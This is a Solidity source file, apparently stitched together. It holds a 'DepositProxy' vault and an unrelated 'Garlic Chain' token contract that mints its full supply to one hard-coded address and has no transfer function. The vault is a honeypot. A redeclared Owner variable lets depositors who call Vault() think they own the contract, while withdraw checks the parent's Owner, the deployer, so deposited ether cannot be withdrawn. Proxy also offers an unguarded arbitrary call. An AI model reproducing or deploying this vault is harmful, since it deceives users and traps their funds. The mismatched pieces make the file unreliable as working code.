 

pragma solidity ^0.4.24;

contract Proxy  {
    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function transferOwner(address _owner) public onlyOwner { Owner = _owner; } 
    function proxy(address target, bytes data) public payable {
         
        target.call.value(msg.value)(data);
    }
}

contract DepositProxy is Proxy {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }
    
    function Vault() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            deposit();
        }
    }
    
    function deposit() public payable {
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }
    
    function withdraw(uint256 amount) public onlyOwner {
        if (amount>0 && Deposits[msg.sender]>=amount) {
            msg.sender.transfer(amount);
        }
    }
}
contract BaseToken{    
    string public name;      
    string public symbol;     
    uint8 public decimals;   
    uint256 public totalSupply;     

    mapping (address => uint256) balances;
    address public owner;
    event Transfer(address indexed from, address indexed to, uint256 value);
}

contract CustomToken is BaseToken {
    function CustomToken() public {
        totalSupply = 2.6 * 100000000 * 1000000;           
        owner = 0x690Ae62C7b56F08d0d712c6e4Ef1103a5A0B38F9;      
        balances[owner] = totalSupply; 
        name = 'Garlic Chain'; 
        symbol = 'GLC';                    
        decimals = 6; 
        Transfer(address(0), owner, totalSupply);
    }    
}
